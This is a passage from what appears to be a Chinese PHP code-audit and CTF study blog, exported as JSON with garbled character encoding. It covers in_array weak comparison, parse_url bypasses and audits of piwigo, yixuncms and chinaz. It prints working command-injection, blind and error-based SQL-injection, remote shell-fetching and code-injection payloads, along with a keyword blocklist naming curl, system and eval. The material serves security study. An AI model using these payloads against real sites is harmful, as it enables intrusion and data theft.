2).&#x27;&lt;x&gt;&#x27;.substr($ra[$i], 2); $val = preg_replace($pattern, $replacement, $val); if ($val_before == $val) &#123; $found = false; &#125; &#125; &#125; return $val; &#125; 0x04 CTFç»ƒä¹  123456789101112131415161718192021// index.php&lt;?php $url = $_GET[&#x27;url&#x27;];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match(&#x27;/sec-redclub.com$/&#x27;,$site_info[&#x27;host&#x27;]))&#123; exec(&#x27;curl &quot;&#x27;.$site_info[&#x27;host&#x27;].&#x27;&quot;&#x27;, $result); echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#x27;host&#x27;]&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;; echo implode(&#x27; &#x27;, $result); &#125; else&#123; die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;); &#125;&#125;else&#123; echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;;&#125;?&gt; 1234// f1agi3hEre.php&lt;?php$flag = &quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;?&gt; mochazzå¸ˆå‚…ç»™çš„payloadï¼š 1?url&#x3D;demo:&#x2F;&#x2F;%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80&#x2F; ä½†æ˜¯ç›¸åŒçš„payloadä¸èƒ½æˆåŠŸï¼Œé—®é¢˜å‡ºåœ¨parse_url()è§£æçš„æ—¶å€™ï¼š 123[&quot;scheme&quot;]&#x3D;&gt; string(4) &quot;demo&quot; [&quot;host&quot;]&#x3D;&gt; string(5) &quot;&quot;;ls;&quot; [&quot;fragment&quot;]&#x3D;&gt; string(20) &quot;;sec-redclub.com:80&#x2F;&quot; è¿™æ ·å°±ä¼šå¯¼è‡´perg_matchåŒ¹é…å¤±è´¥ã€‚æˆ‘æ¢äº†å¦å¤–ä¸€ä¸ªpayloadï¼Œç”¨äºé—­åˆæœ€åä¸€ä¸ª&quot;ï¼š 1http:&#x2F;&#x2F;192.168.153.132:8003&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F; è§£é‡Šä¸€ä¸‹è¿™ä¸ªPayloadï¼š å…ˆæ¥ç»•è¿‡ filter_var çš„ FILTER_VALIDATE_URL è¿‡æ»¤å™¨ï¼Œè¿™é‡Œæä¾›å‡ ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š 12345678http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.comPS:æœ€åä¸€ä¸ªpayloadçš„#ç¬¦å·ï¼Œè¯·æ¢æˆå¯¹åº”çš„urlç¼–ç  %23 æ¥ç€è¦ç»•è¿‡ parse_url å‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³ $site_info[â€˜hostâ€™] çš„å€¼ä»¥ sec-redclub.com ç»“å°¾ 1?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F; ç¬¬ä¸€ä¸ª%22ç”¨äºé—­åˆå‰é¢çš„åŒå¼•å·ï¼Œåˆ†å·å¯ä»¥åœ¨Linuxç³»ç»Ÿä¸Šè¿ç»­æ‰§è¡Œå‘½ä»¤ï¼Œåé¢ä¸€ä¸ª%22ç”¨äºé—­åˆåé¢çš„å¼•å·ã€‚","tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1","date":"2020-06-09T11:30:48.000Z","path":"code_audit/3.PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1/","text":"PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1 in_arrayå‡½æ•°ç¼ºé™· å­¦ä¹ èµ„æºå‡æ¥è‡ªäºmochazzå¸ˆå‚…ï¼Œæ„Ÿè°¢çº¢æ—¥å®‰å…¨ä»£ç å®¡è®¡å°ç»„çš„åˆ†äº« 0x01 Day1 - Wish List 123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = &#x27;./solutions/&#x27;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&#x27;name&#x27;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&#x27;tmp_name&#x27;], self::UPLOAD_DIRECTORY . $this-&gt;file[&#x27;name&#x27;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&#x27;solution&#x27;]); è¿™ä¸€å…³å¡è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸»è¦é—®é¢˜å‡ºåœ¨in_arrayå‡½æ•°ï¼Œæ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯¹è¿™ä¸ªå‡½æ•°çš„è§£é‡Šï¼š in_array (PHP 4, PHP 5, PHP 7) åŠŸèƒ½ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ å®šä¹‰ï¼šin_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool åœ¨ $haystack ä¸­æœç´¢ $needle ï¼Œå¦‚æœç¬¬ä¸‰ä¸ªå‚æ•° $strict çš„å€¼ä¸º TRUE ï¼Œåˆ™ in_array() å‡½æ•°ä¼šè¿›è¡Œå¼ºæ£€æŸ¥ï¼Œæ£€æŸ¥ $needle çš„ç±»å‹æ˜¯å¦å’Œ $haystack ä¸­çš„ç›¸åŒã€‚å¦‚æœæ‰¾åˆ° $haystack ï¼Œåˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ ç”±äºè¯¥å‡½æ•°å¹¶æœªå°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸ºï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤å¤„æ„é€ æ–‡ä»¶åä¸º7shell.phpï¼Œin_array()å‡½æ•°ä¼šå°†7shell.phpå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—7ï¼Œæ•°å­—7åœ¨$this-&gt; whitelistä¹Ÿå°±æ˜¯æ•°ç»„çš„1-24ä¸­ï¼Œç»•è¿‡in_array()çš„å‡½æ•°åˆ¤æ–­ï¼Œå¯ä»¥æ„é€ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ 0x02 å®ä¾‹åˆ†æ - piwigo2.7.1 é¦–å…ˆå®‰è£…å¥½ç½‘ç«™åï¼Œéšä¾¿å‘å¸ƒä¸€å¼ å›¾ç‰‡ï¼Œæ¼æ´çš„å…¥å£æ–‡ä»¶åœ¨ picture.php ä¸­ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 12345678910111213// picture.phpif (isset($_GET[&#x27;action&#x27;]))&#123; switch ($_GET[&#x27;action&#x27;]) &#123;...... case &#x27;rate&#x27; : &#123; include_once(PHPWG_ROOT_PATH.&#x27;include/functions_rate.inc.php&#x27;); rate_picture($page[&#x27;image_id&#x27;], $_POST[&#x27;rate&#x27;]); redirect($url_self); &#125;...... å½“ $_GET[â€˜actionâ€™] ä¸º rate çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨æ–‡ä»¶ include/functions_rate.inc.php ä¸­çš„ rate_picture æ–¹æ³•ï¼Œè€Œæ¼æ´ä¾¿å­˜åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ã€‚ è·Ÿå…¥rate_picture å‡½æ•¸ï¼Œå‡½æ•°å¯¹ $rate å˜é‡è¿›è¡Œæ£€æµ‹ï¼Œåˆ¤æ–­ â€‹rate æ˜¯å¦åœ¨ â€‹$conf[â€˜rate_itemsâ€™] ä¸­ï¼Œ â€‹$conf[â€˜rate_itemsâ€™] çš„å†…å®¹å¯ä»¥åœ¨ include\\config_default.inc.php ä¸­æ‰¾åˆ°ï¼Œä¸º $conf['rate_items'] = array(0,1,2,3,4,5); 12345678910111213141516171819202122232425262728293031function rate_picture($image_id, $rate)&#123; global $conf, $user; if (!isset($rate) or !$conf[&#x27;rate&#x27;] or !in_array($rate, $conf[&#x27;rate_items&#x27;])) &#123; return false; &#125; $user_anonymous = is_autorize_status(ACCESS_CLASSIC) ? false : true; if ($user_anonymous and !$conf[&#x27;rate_anonymous&#x27;]) &#123; return false; &#125; ...... $query = &#x27;INSERT INTO &#x27;.RATE_TABLE.&#x27; (user_id,anonymous_id,element_id,rate,date) VALUES (&#x27; .$user[&#x27;id&#x27;].&#x27;,&#x27; .&#x27;\\&#x27;&#x27;.$anonymous_id.&#x27;\\&#x27;,&#x27; .$image_id.&#x27;,&#x27; .$rate .&#x27;,NOW());&#x27;; pwg_query($query); ç”±äºè¿™é‡Œï¼ˆç¬¬7è¡Œï¼‰å¹¶æ²¡æœ‰å°† in_array() å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ï¼Œæ‰€ä»¥ä¼šè¿›è¡Œå¼±æ¯”è¾ƒï¼Œå¯ä»¥ç»•è¿‡ã€‚æ¯”å¦‚æˆ‘ä»¬å°† $rate çš„å€¼è®¾ç½®æˆ 1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# é‚£ä¹ˆSQLè¯­å¥å°±å˜æˆï¼š 1INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&#39;192.168.2&#39;,1,1,1 and if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#,NOW()) ; 0x03 ç»ƒä¹ é¢˜ 1234567891011121314151617181920212223242526272829303132333435363738//index.php&lt;?phpinclude &#x27;config.php&#x27;;$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot;);&#125;$sql = &quot;SELECT COUNT(*) FROM users&quot;;$whitelist = array();$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]);&#125;$id = stop_hack($_GET[&#x27;id&#x27;]);$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;);&#125;$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;;&#125;else&#123; die($conn-&gt;error);&#125;?&gt; 1234567891011121314151617//config.php&lt;?php $servername = &quot;localhost&quot;;$username = &quot;fire&quot;;$password = &quot;fire&quot;;$dbname = &quot;day1&quot;;function stop_hack($value)&#123; $pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;; $back_list = explode(&quot;|&quot;,$pattern); foreach($back_list as $hack)&#123; if(preg_match(&quot;/$hack/i&quot;, $value)) die(&quot;$hack detected!&quot;); &#125; return $value;&#125;?&gt; 1234567891011121314151617# æ­å»ºCTFç¯å¢ƒä½¿ç”¨çš„sqlè¯­å¥create database day1;use day1;create table users (id int(6) unsigned auto_increment primary key,name varchar(20) not null,email varchar(30) not null,salary int(8) unsigned not null );INSERT INTO users VALUES(1,&#x27;Lucia&#x27;,&#x27;Lucia@hongri.com&#x27;,3000);INSERT INTO users VALUES(2,&#x27;Danny&#x27;,&#x27;Danny@hongri.com&#x27;,4500);INSERT INTO users VALUES(3,&#x27;Alina&#x27;,&#x27;Alina@hongri.com&#x27;,2700);INSERT INTO users VALUES(4,&#x27;Jameson&#x27;,&#x27;Jameson@hongri.com&#x27;,10000);INSERT INTO users VALUES(5,&#x27;Allie&#x27;,&#x27;Allie@hongri.com&#x27;,6000);create table flag(flag varchar(30) not null);INSERT INTO flag VALUES(&#x27;HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;&#x27;); å°è¯•å¯¹idè¿™ä¸ªå‚æ•°æ³¨å…¥å‘ç°config.phpå¯¹æ³¨å…¥è¿›è¡Œäº†é™åˆ¶ï¼Œè¿‡æ»¤äº†å…³é”®å­—insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|evalã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼ŒæŠŠgroup_concatæ¢æˆmake_setå‡½æ•°ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ã€‚ make_setï¼šhttps://blog.csdn.net/qq_41725312/article/details/83039525 Payloadï¼š 1http:&#x2F;&#x2F;127.0.0.1&#x2F;PHP-Audit-Labs&#x2F;day1&#x2F;?id&#x3D;3%20and%20(select%20updatexml(1,make_set(3,%27~%27,(select%20flag% 20fromï¼…20flagï¼‰ï¼‰ï¼Œ1ï¼‰ï¼‰","tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHPä»£ç å®¡è®¡â€”â€”yixuncms","date":"2020-06-08T07:28:46.000Z","path":"code_audit/1.PHPä»£ç å®¡è®¡å¤ç°â€”â€”yixuncms/","text":"PHPä»£ç å®¡è®¡â€”â€”yixuncmså®¡è®¡ 0x01 å®¡è®¡å…¥å£ å¯¹äºä¸€ä¸ªMVCç»“æ„è€Œè¨€ï¼Œæ¯”è¾ƒé‡è¦çš„å°±æ˜¯é¦–å…ˆå¼„æ¸…æ¥šè·¯ç”±æ˜¯æ€ä¹ˆèµ°çš„ï¼Œé¦–å…ˆçœ‹åˆ°index.phpä¸­åŒ…å«äº†home/index.phpï¼Œå…¶ä¸­ç¬¬106è¡Œè°ƒç”¨äº†Prourl::parseUrl();ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥è§£æUrlï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041// class/prourl.class.php&lt;?php class Prourl &#123; /** * URLè·¯ç”±,è½¬ä¸ºPATHINFOçš„æ ¼å¼ */ static function parseUrl()&#123; if (isset($_SERVER[&#x27;PATH_INFO&#x27;]))&#123; //è·å– pathinfo $pathinfo = explode(&#x27;/&#x27;, trim($_SERVER[&#x27;PATH_INFO&#x27;], &quot;/&quot;)); // è·å– control $_GET[&#x27;m&#x27;] = (!empty($pathinfo[0]) ? $pathinfo[0] : &#x27;index&#x27;); array_shift($pathinfo); //å°†æ•°ç»„å¼€å¤´çš„å•å…ƒç§»å‡ºæ•°ç»„ // è·å– action $_GET[&#x27;a&#x27;] = (!empty($pathinfo[0]) ? $pathinfo[0] : &#x27;index&#x27;); array_shift($pathinfo); //å†å°†å°†æ•°ç»„å¼€å¤´çš„å•å…ƒç§»å‡ºæ•°ç»„ for($i=0; $i&lt;count($pathinfo); $i+=2)&#123; $_GET[$pathinfo[$i]]=$pathinfo[$i+1]; &#125; &#125;else&#123; $_GET[&quot;m&quot;]= (!empty($_GET[&#x27;m&#x27;]) ? $_GET[&#x27;m&#x27;]: &#x27;index&#x27;); //é»˜è®¤æ˜¯indexæ¨¡å— $_GET[&quot;a&quot;]= (!empty($_GET[&#x27;a&#x27;]) ? $_GET[&#x27;a&#x27;] : &#x27;index&#x27;); //é»˜è®¤æ˜¯indexåŠ¨ä½œ if($_SERVER[&quot;QUERY_STRING&quot;])&#123; $m=$_GET[&quot;m&quot;]; unset($_GET[&quot;m&quot;]); //å»é™¤æ•°ç»„ä¸­çš„m $a=$_GET[&quot;a&quot;]; unset($_GET[&quot;a&quot;]); //å»é™¤æ•°ç»„ä¸­çš„a $query=http_build_query($_GET); //å½¢æˆ0=foo&amp;1=bar&amp;2=baz&amp;3=boom&amp;cow=milkæ ¼å¼ //ç»„æˆæ–°çš„URL $url=$_SERVER[&quot;SCRIPT_NAME&quot;].&quot;/&#123;$m&#125;/&#123;$a&#125;/&quot;.str_replace(array(&quot;&amp;&quot;,&quot;=&quot;), &quot;/&quot;, $query); header(&quot;Location:&quot;.$url); &#125; &#125; &#125; &#125; â€˜PATH_INFOâ€™ åŒ…å«ç”±å®¢æˆ·ç«¯æä¾›çš„ã€è·Ÿåœ¨çœŸå®è„šæœ¬åç§°ä¹‹åå¹¶ä¸”åœ¨æŸ¥è¯¢è¯­å¥ï¼ˆquery stringï¼‰ä¹‹å‰çš„è·¯å¾„ä¿¡æ¯ï¼Œå¦‚æœå­˜åœ¨çš„è¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå½“å‰è„šæœ¬æ˜¯é€šè¿‡ URL http://www.example.com/php/path_info.php/some/stuff?foo=bar è¢«è®¿é—®ï¼Œé‚£ä¹ˆ $_SERVER[â€˜PATH_INFOâ€™] å°†åŒ…å« /some/stuffã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚è®¿é—®http://127.0.0.1/index.php/index/hello/pid/1ï¼Œé‚£ä¹ˆparseUrl()å‡½æ•°ä¼šå°†indexè§£ææˆç±»åï¼Œhelloè§£ææˆæ–¹æ³•åï¼Œpidæ˜¯å‚æ•°åï¼Œ1æ˜¯å‚æ•°å€¼ã€‚å¦‚æœæ˜¯é€šè¿‡GETä¼ å‚çš„å½¢å¼ä¼ å…¥çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šå…ˆå°†Urlè½¬æ¢æˆä¸Šé¢è¿™ç§è¡¨ç¤ºå½¢å¼ï¼Œå†æŒ‰ç›¸åŒçš„æµç¨‹å¤„ç†ã€‚ å¦å¤–ï¼Œé¡¹ç›®ä¸­çš„runtimeæ˜¯å¯¹ç½‘ç«™çš„ç¼“å­˜æ–‡ä»¶ï¼Œä¹Ÿå°±è¯´å‡å¦‚ä½ è®¿é—®äº†adminåå°ç½‘ç«™ï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡å†è®¿é—®çš„æ—¶å€™å°±ä¼šåœ¨runtimeç›®å½•ä¸‹æ‰§è¡Œï¼Œè€Œä¸æ˜¯è¿›å…¥adminç›®å½•ã€‚ 0x02 å®¡è®¡è¿‡ç¨‹ é¦–å…ˆç”¨Seayå’ŒRipså·¥å…·æ‰«æä¸€éï¼Œæœ‰ä¸€ä¸ªå¤§æ¦‚çš„æ–¹å‘ã€‚ controls/flink.class.phpä»»æ„æ–‡ä»¶åˆ é™¤ 123456789101112131415161718192021222324252627function update()&#123; $flink = D(&#x27;flink&#x27;); if(isset($_POST[&#x27;logoc&#x27;]))&#123; $logo = $flink-&gt;downlogo($_POST[&#x27;logoc&#x27;]); $srclogo = PROJECT_PATH.&quot;public/uploads/logos/&quot;.$_POST[&quot;logo&quot;]; if(file_exists($srclogo)) unlink($srclogo); &#125;else&#123; $logo = $_POST[&quot;logo&quot;]; &#125; if($logo)&#123; $_POST[&quot;logo&quot;] = $logo; if($flink-&gt;update($_POST,1,1))&#123; $this-&gt;redirect(&quot;index&quot;); &#125;else&#123; $mess = $flink-&gt;getMsg(); if($mess == &quot;&quot;) $mess = &quot;æ‚¨æœªåšä»»ä½•ä¿®æ”¹&quot;; $this-&gt;mess($mess,false); $this-&gt;assign(&quot;post&quot;,$_POST); &#125; &#125;else&#123; $this-&gt;mess(&quot;LOGOä¸‹è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥URLåœ°å€æ˜¯å¦æ­£ç¡®&quot;,false); $this-&gt;assign(&quot;post&quot;,$_POST); &#125; $this-&gt;display(&quot;mod&quot;); &#125; æ¼æ´å‡ºåœ¨ç¬¬55è¡Œçš„unlink()å‡½æ•°ï¼Œå‚æ•°$srclogoæ˜¯ç”±ç”¨æˆ·POSTå‚æ•°logoå†æ‹¼æ¥ç½‘ç«™ç›®å½•å¾—åˆ°çš„ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±å¾ˆå®¹æ˜“åˆ©ç”¨è·¯å¾„éå†æ¥åˆ é™¤ä»»ä½•æ–‡ä»¶ã€‚åˆ©ç”¨æ–¹å¼ï¼š models/flink.php.classæ–‡ä»¶å†™å…¥ é¦–å…ˆé€šè¿‡ä¸€ä¸ªå±é™©å‡½æ•°file_put_contens()å®šä½åˆ°models/flink.class.phpæ–‡ä»¶ 12345678910111213141516171819&lt;?php class Flink&#123; function downlogo($logourl)&#123; $url = parse_url($logourl); $logoname = str_replace(&quot;.&quot;,&quot;_&quot;,$url[&#x27;host&#x27;]).&quot;.&quot;.array_pop(explode(&quot;.&quot;,basename($logourl))); $path = PROJECT_PATH.&quot;public/uploads/logos/&quot;; if(!file_exists($path))&#123; mkdir($path); &#125; $location = $path.$logoname; $data = file_get_contents($logourl); if(strlen($data) &gt; 0)&#123; file_put_contents($location,$data); return $logoname; &#125;else&#123; return false; &#125; &#125; &#125; file_put_contents()æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼š$locationå’Œ$dataã€‚$locationå‚æ•°æ˜¯é€šè¿‡æ‹¼æ¥.public/uploads/logoså’Œ$logonameï¼Œè€Œlogonameé¦–å…ˆé€šè¿‡parse_urlæŠŠ$logourlè§£ææˆæ•°ç»„å½¢å¼ï¼Œç„¶åå†æŠŠhostå­—æ®µçš„å€¼ä¸­çš„.æ›¿æ¢æˆ_ï¼Œåç¼€åæ˜¯æ–‡ä»¶çš„åç¼€åï¼Œä¸¾ä¸ªä¾‹å­ï¼šåŠ å…¥$url=http://127.0.0.1/shell.phpï¼Œé‚£ä¹ˆ$logoname=127_0_0_1.phpã€‚å¦å¤–ï¼Œ$dataå‚æ•°æ˜¯é€šè¿‡file_get_contents()å‡½æ•°è¯»å–Urlä¸­çš„æ–‡ä»¶å†…å®¹ã€‚ å…¨å±€æœç´¢downlogoå…³é”®å­—ï¼Œå‘ç°controls/flink.class.phpæ–‡ä»¶ä¸­çš„insert()å‡½æ•°è°ƒç”¨äº†downlogo()å‡½æ•°ï¼Œé€šè¿‡POSTçš„æ–¹å¼ä¼ å‚ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š ç¬¬ä¸€æ­¥é¦–å…ˆåœ¨è‡ªå·±çš„VPSä¸­å†™ä¸€ä¸ªshell.phpæ–‡ä»¶ï¼š 1234567&lt;?php echo &quot; &lt;?php system(&#x27;ipconfig&#x27;); ?&gt; &quot;;?&gt; å› ä¸ºæºä»£ç ä¸­æ˜¯é€šè¿‡file_get_contents()å‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»æŠŠçœŸæ­£çš„shellæ–‡ä»¶å†…å®¹echoåˆ°é¡µé¢ä¸Šã€‚ å‘èµ·è¯·æ±‚ è®¿é—®http://localhost/public/uploads/logos/xx_xx_xx_xx.php classes/baseset.class.phpä»»æ„ä»£ç æ‰§è¡Œ ä»ç„¶æ˜¯å…¨å±€æœç´¢file_put_contentså…³é”®å­—ï¼Œåœ¨classes/baseset.class.phpæ–‡ä»¶ä¸­ 123456789static function writeindex($style,$start)&#123; $file=PROJECT_PATH.&quot;index.php&quot;; $content=file_get_contents($file); $reg[]=&quot;/define\\(\\&quot;TPLSTYLE\\&quot;.+?;/i&quot;; $reg[]=&quot;/define\\(\\&quot;CSTART\\&quot;.+?;/i&quot;; $rep[]=&quot;define(\\&quot;TPLSTYLE\\&quot;,\\&quot;&#123;$style&#125;\\&quot;);&quot;; $rep[]=&quot;define(\\&quot;CSTART\\&quot;,\\&quot;&#123;$start&#125;\\&quot;);&quot;; file_put_contents($file, preg_replace($reg, $rep, $content));&#125; ç®€å•æ¥è®²ï¼Œwriteindex()å‡½æ•°å°±æ˜¯å°†index.phpä¸­çš„ä¸¤ä¸ªå¸¸é‡TPLSTYLEå’ŒCSTARTçš„å€¼åˆ†åˆ«æ›¿æ¢æˆ$styleå’Œ$startã€‚ 123456&lt;?php define(&quot;CSTART&quot;,&quot;0&quot;); //æ˜¯å¦å¼€å¯ç¼“å­˜ 1å¼€å¯ 0å…³é—­ define(&quot;TPLSTYLE&quot;,&quot;default&quot;); //é»˜è®¤æ¨¡æ¿å­˜æ”¾çš„ç›®å½• define(&quot;APP&quot;, &quot;./home&quot;); require &quot;./php/index.php&quot;;?&gt; å¦‚æœ$start=0&quot;); &lt;?php phpinfo(); ?&gt; &lt;?php // ï¼Œé‚£ä¹ˆå°±å˜æˆäº†ï¼š 12&lt;?php define(&quot;CSTART&quot;,&quot;0&quot;); &lt;?php phpinfo(); ?&gt; &lt;?php //&quot;); è¿™æ ·å°±é€ æˆäº†ä»£ç æ‰§è¡Œæ¼æ´ã€‚ é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹å“ªäº›åœ°æ–¹è°ƒç”¨äº†writeindex()å‡½æ•°ï¼š å†å…¨å±€æœç´¢writeindex()å‡½æ•°ï¼š åˆ©ç”¨æ–¹å¼ï¼š 0x03 å¸¸è§å‡½æ•° ä»£ç æ‰§è¡Œå‡½æ•° æ–‡ä»¶ç›¸å…³å‡½æ•°","tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHPä»£ç å®¡è®¡â€”â€”chinaz","date":"2020-06-06T16:02:12.000Z","path":"code_audit/2.PHPä»£ç å®¡è®¡å¤ç°â€”â€”chinaz/","text":"PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”chinaz 0x01 å®¡è®¡å…¥å£ é¦–å…ˆchinazæ²¡æœ‰åå°æ•°æ®åº“ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªå•å…¥å£ç±»ï¼Œä¸åŒäºä¸Šä¸€ç¯‡Yixuncmsæ˜¯ä¸€ä¸ªMVCçš„æ¶æ„æ¨¡å¼ã€‚ 123456789101112131415// index.php&lt;?phprequire_once(&quot;library/common.php&quot;);require_once(&quot;library/view.php&quot;);$view_class = new View();$data = array();if (isset($_GET[&#x27;page&#x27;]))&#123; $data[&#x27;page&#x27;] = filter($_GET[&#x27;page&#x27;]);&#125;else&#123; $data[&#x27;page&#x27;] = &#x27;js&#x27;;&#125;$view_class-&gt;echoContent($data[&#x27;page&#x27;], $data);?&gt; åœ¨index.phpæ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°é¦–å…ˆåŒ…å«äº†å…¬å…±æ–‡ä»¶å’Œæ¸²æŸ“æ–‡ä»¶è¿›æ¥ï¼Œç„¶ånewäº†ä¸€ä¸ªViewç±»çš„å¯¹è±¡ã€‚ 